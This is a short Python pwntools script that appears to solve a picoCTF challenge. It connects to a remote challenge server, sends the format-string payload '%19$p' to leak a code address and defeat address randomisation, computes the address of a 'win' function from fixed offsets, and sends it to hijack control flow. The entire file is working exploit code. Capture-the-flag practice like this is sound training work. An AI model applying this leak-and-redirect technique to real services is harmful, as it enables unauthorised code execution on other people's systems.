from pwn import *

context.log_level = 'info'

HOST = "rescued-float.picoctf.net"
PORT = 53006
r = remote(HOST, PORT)

r.recvuntil(b"Enter your name:")
r.sendline("%19$p".encode())
address = r.recvline().decode().replace("\n", "")
info(f"Leaked address: {address}")
r.recvuntil(b"0x12345:")
win_addr = int(address, 16) - 0x1441 + 0x136a
info(f"Win address: {hex(win_addr)}")

r.sendline(hex(win_addr).encode())

info(r.recvall().decode())

r.close()
